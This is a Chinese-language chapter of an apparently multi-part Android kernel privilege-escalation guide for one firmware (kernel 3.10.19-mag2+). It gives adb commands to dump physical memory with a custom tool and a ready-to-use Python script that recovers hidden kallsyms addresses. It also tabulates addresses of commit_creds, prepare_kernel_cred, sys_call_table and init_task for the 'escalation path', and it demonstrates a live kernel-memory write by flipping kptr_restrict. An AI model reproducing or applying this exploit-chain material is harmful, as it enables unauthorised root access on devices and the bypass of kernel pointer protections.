# 03 · 内核 dump 与 kallsyms 符号还原

目标：从**只读**物理内存 dump 中还原当前内核的真实符号地址（`commit_creds` / `prepare_kernel_cred` / `sys_call_table` / `init_task` / `kptr_restrict`），为后续提权提供精确坐标。

---

## 1. 用 `rtdump` dump 物理内存

`rtdump` 的接口是：

```
rtdump <输出文件> <起始物理地址(hex)> <结束物理地址(hex)>
```

它按 **1 MiB** 分块 `mmap(PROT_READ|MAP_SHARED)`，每块用 `SIGSEGV`/`SIGBUS` + `sigsetjmp` 保护：不可读的页填 0 而不是让进程崩溃。全程只读。

```bash
adb push rtdump /data/local/tmp/
adb shell 'chmod 755 /data/local/tmp/rtdump'

# dump 前 16 MiB（含内核代码、数据、init_task 等）
adb shell '/data/local/tmp/rtdump /data/local/tmp/kernel.bin 0 1000000'
# 注意：参数是 16 进制，1000000 = 0x1000000 = 16 MiB

adb pull /data/local/tmp/kernel.bin <DUMP_DIR>/kernel.bin
```

> 参数没有 `0x` 前缀，`strtoull(..., 16)` 解析；写 `0x1000000` 也能识别。dump 出来的文件按「物理地址从 0 开始」线性排列：文件偏移 `X` 对应物理地址 `X`。

---

## 2. 校验：抓到的是不是当前固件的内核？

在 dump 里搜 `Linux version` 字符串，并与设备的 `/proc/version` 比对：

```bash
strings -a <DUMP_DIR>/kernel.bin | grep -i 'Linux version'

adb shell 'cat /proc/version'
# Linux version 3.10.19-mag2+ (<BUILD_USER>@<BUILD_HOST>) (gcc version ...) #<BUILD_NO> SMP PREEMPT <BUILD_DATE>
```

两侧的版本字符串必须**逐字一致**（内核版本 `3.10.19-mag2+`、`#SMP PREEMPT`、编译号都能对上）。这是确认 dump 来自「正在运行的这一份固件」的硬证据；不一致就说明参数、设备或 dump 文件搞错了，不要继续。

同步保存一份可从 `/proc/kallsyms` 读到名字的列表（地址全 0 没关系，我们只要名字和顺序）：

```bash
adb shell 'cat /proc/kallsyms' > <RECON_DIR>/kallsyms.txt
wc -l <RECON_DIR>/kallsyms.txt        # 本 firmware 六万多行
```

---

## 3. 为什么能从 dump 还原 kallsyms

`kptr_restrict=2` 只让 `/proc/kallsyms` 的**输出地址**变成 0，内核镜像里编译期生成的几张表仍然完整驻留在内存中：

| 表 | 作用 |
|---|---|
| `kallsyms_addresses` | 按符号地址升序排列的 `u32` 虚拟地址数组 |
| `kallsyms_num_syms` | 符号个数 |
| `kallsyms_names` | 用 **token 表**压缩过的符号名字符串流（前缀复用，节省镜像体积） |
| `kallsyms_token_table` / `kallsyms_token_index` | token 编号 → 字符串片段的解码表 |
| `kallsyms_markers` | 每 256 个符号在 names 流里的偏移，便于随机访问 |

`find_kallsyms.py` 的策略不是去实现 token 解码，而是：

1. **地址表用 dump**：扫描 dump 中「最长的一段连续递增、且都落在 `0xC0000000`–`0xC1000000` 的 `u32` 序列」——这就是 `kallsyms_addresses`。因为内核符号按虚拟地址排序，这段序列天然单调递增，且每个值都是内核空间地址。
2. **名字用 `/proc/kallsyms`**：`/proc/kallsyms` 的**行顺序与 `kallsyms_addresses` 的下标顺序一致**（都源自同一份内核表）。既然名字可以直接读到，就不必解码 `kallsyms_names` 的 token 流。
3. **按索引对齐**：`addresses[k]` ↔ `kallsyms.txt` 第 `k` 行，得到「名字 → 真实虚拟地址」的映射，输出 `symbols_recovered.txt`。

> 这就是 token 表在我们的方法里「存在但不直接使用」的原因：名字从内核接口拿，地址从内存拿，两侧按同一顺序拼起来。若某台设备的 `/proc/kallsyms` 被完全禁用，才需要真正解析 `kallsyms_names` + token 表。

---

## 4. `find_kallsyms.py`（脱敏、可直接用）

把下面代码保存为 `find_kallsyms.py`。它把路径改成命令行参数，去掉了硬编码的本机路径。

```python
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""从物理内存 dump 还原 kallsyms 真实地址。

用法:
    python3 find_kallsyms.py <kernel.bin> <kallsyms.txt> [-o symbols_recovered.txt]
"""
import argparse
import struct
import sys

PAGE_OFFSET = 0xC0000000
KERN_LO, KERN_HI = 0xC0000000, 0xC1000000   # 内核虚拟地址范围（过滤用）

TARGETS = [
    "sys_call_table", "commit_creds", "prepare_kernel_cred",
    "init_task", "kptr_restrict", "vector_swi", "ptmx_fops",
    "sys_setresuid", "sys_read", "sys_write",
]


def load_names(path):
    names = []
    with open(path, encoding="utf-8", errors="replace") as f:
        for line in f:
            parts = line.rstrip("\n").split(" ", 2)
            if len(parts) >= 3:
                names.append((parts[0], parts[1], parts[2]))
            elif len(parts) == 2:
                names.append((parts[0], parts[1], ""))
    return names


def find_address_table(d):
    """找最长的连续递增 0xC0xxxxxx u32 序列 => kallsyms_addresses。"""
    best = (0, 0)                 # (start_offset, count)
    i, n = 0, len(d) - 4
    while i < n:
        v = struct.unpack_from("<I", d, i)[0]
        if KERN_LO <= v <= KERN_HI:
            j, prev, cnt = i + 4, v, 1
            while j < n:
                w = struct.unpack_from("<I", d, j)[0]
                if not (KERN_LO <= w <= KERN_HI) or w < prev:
                    break
                prev, cnt, j = w, cnt + 1, j + 4
            if cnt > best[1]:
                best = (i, cnt)
            i = j
        else:
            i += 4
    return best


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("dump")
    ap.add_argument("kallsyms")
    ap.add_argument("-o", "--out", default="symbols_recovered.txt")
    args = ap.parse_args()

    d = open(args.dump, "rb").read()
    names = load_names(args.kallsyms)
    print("[*] kallsyms lines:", len(names))

    start, count = find_address_table(d)
    print("[*] longest ascending 0xC0xxxxxx run: offset=0x%x count=%d"
          % (start, count))
    print("    => virtual addr of table: 0x%08x" % (start + PAGE_OFFSET))
    if count < 1000:
        print("[!] run too short, aborting")
        return 1

    # 表项按 dump 顺序读出；与 /proc/kallsyms 行按顺序对齐
    addrs = [struct.unpack_from("<I", d, start + 4 * k)[0]
             for k in range(count)]

    print("\n[*] first 6 (addr, kallsyms line):")
    for k in range(min(6, count, len(names))):
        print("    0x%08x  %s" % (addrs[k], " ".join(names[k])))

    idx = {nm: k for k, (_a, _t, nm) in enumerate(names)}
    print("\n[*] key symbols:")
    for t in TARGETS:
        if t in idx and idx[t] < count:
            print("    %-22s 0x%08x (index %d)" % (t, addrs[idx[t]], idx[t]))
        else:
            print("    %-22s not resolvable" % t)

    print("\n[*] names=%d table_entries=%d delta=%d"
          % (len(names), count, len(names) - count))

    with open(args.out, "w", encoding="utf-8") as f:
        for k in range(min(count, len(names))):
            a, t, nm = names[k]
            f.write("%08x %s %s\n" % (addrs[k], t, nm))
    print("[*] wrote recovered symbols ->", args.out)
    return 0


if __name__ == "__main__":
    sys.exit(main())
```

运行：

```bash
python3 find_kallsyms.py <DUMP_DIR>/kernel.bin <RECON_DIR>/kallsyms.txt \
        -o <RECON_DIR>/symbols_recovered.txt
```

输出里「最长递增段」的起始偏移加上 `PAGE_OFFSET` 就是 `kallsyms_addresses` 表的虚拟地址；`first 6` 用来肉眼检查对齐是否正确（地址应该落在内核代码/数据区间）。若 `delta` 很大（`names` 远多于 `table_entries`），说明对齐起点选错，需要检查 dump 是否完整。

---

## 5. 本 firmware 的关键符号地址

以下为**本固件实测值**，仅适用于 `3.10.19-mag2+` 这一份镜像；换固件必须重跑脚本：

| 符号 | 虚拟地址 | 用途 |
|---|---|---|
| `sys_call_table` | `0xc0113a88` | 系统调用表，交叉验证与备选 hook 点 |
| `commit_creds` | `0xc018d40c` | 提交新 cred（提权路径） |
| `prepare_kernel_cred` | `0xc018d998` | 构造 uid=0 的新 cred |
| `init_task` | `0xc0c962c8` | 0 号进程 task_struct，常作为扫描锚点 |
| `kptr_restrict` | `0xc0c8f6cc` | 无害写通道验证目标 |

换算成物理地址只需减去 `0xC0000000`：

```
sys_call_table      -> 0x00113a88
commit_creds        -> 0x0018d40c
prepare_kernel_cred -> 0x0018d998
init_task           -> 0x00c962c8
kptr_restrict       -> 0x00c8f6cc
```

---

## 6. 交叉验证：确认符号表没有错位

### 6.1 用 `sys_call_table[3] / [4]`

ARM EABI 的调用号：`3 = sys_read`，`4 = sys_write`。`sys_call_table` 是 `u32` 指针数组：

```python
import struct
d = open("<DUMP_DIR>/kernel.bin", "rb").read()
base = 0xc0113a88 - 0xC0000000          # = 0x00113a88, 文件内偏移=物理地址
for idx in (3, 4):
    val = struct.unpack_from("<I", d, base + idx * 4)[0]
    print("sys_call_table[%d] = 0x%08x" % (idx, val))
# 期望：
# sys_call_table[3] == sys_read  的地址
# sys_call_table[4] == sys_write 的地址
```

把打印出的值与 `symbols_recovered.txt` 里的 `sys_read` / `sys_write` 行比对，**必须完全相等**。这一步能同时证明：

- `sys_call_table` 地址正确；
- 地址表与名字表的**索引对齐没有偏移**。

### 6.2 用 `kptr_restrict` 做无害写验证

在动 cred 之前，先证明「写真的能落到活内核」。`rtwrite.c` 只改一个不影响权限的 sysctl：

```bash
adb push rtwrite /data/local/tmp/ && adb shell 'chmod 755 /data/local/tmp/rtwrite'

# 当前值应为 2（先用独立路径读取）
adb shell 'cat /proc/sys/kernel/kptr_restrict'
adb shell 'grep " kptr_restrict" /proc/kallsyms'      # 地址此时是 0

# 2 -> 0
adb shell '/data/local/tmp/rtwrite 0'
# 独立路径确认：sysctl 变了，且 /proc/kallsyms 现在开始显示真实地址
adb shell 'cat /proc/sys/kernel/kptr_restrict'        # 0
adb shell 'grep " sys_call_table" /proc/kallsyms'     # 应显示 c0113a88

# 立刻改回 2
adb shell '/data/local/tmp/rtwrite 2'
adb shell 'cat /proc/sys/kernel/kptr_restrict'        # 2
```

`rtwrite` 内部做了三重保护：

- 只接受参数 `0` 或 `2`；
- 先从映射槽读出当前值，若既不是 0 也不是 2 就**拒绝写**（防止找错 slot）；
- 写后 `__sync_synchronize()` + `msync(MS_SYNC)`，确保存储对内核可见。

若从 `sysctl` 和 `/proc/kallsyms` 两条**独立路径**都观察到变化，说明 RW mmap 写通道有效且地址换算正确。若两处都没变化，停止，回去检查 `PAGE_OFFSET` 和节点语义。

---

## 7. 本阶段产出

- `<DUMP_DIR>/kernel.bin`：前 16 MiB 物理内存只读镜像；
- `<RECON_DIR>/symbols_recovered.txt`：完整「地址 类型 名字」表；
- 五个关键符号的虚拟地址已确认，并通过 `sys_call_table[3]/[4]` 与 `kptr_restrict` 双重交叉验证。

下一步：[`04-building.md`](04-building.md) —— 解决编译与 PT_TLS 对齐问题，让工具能在设备上跑起来（如果你已解决编译，可直接跳到 [`05-escalation-and-persistence.md`](05-escalation-and-persistence.md)）。
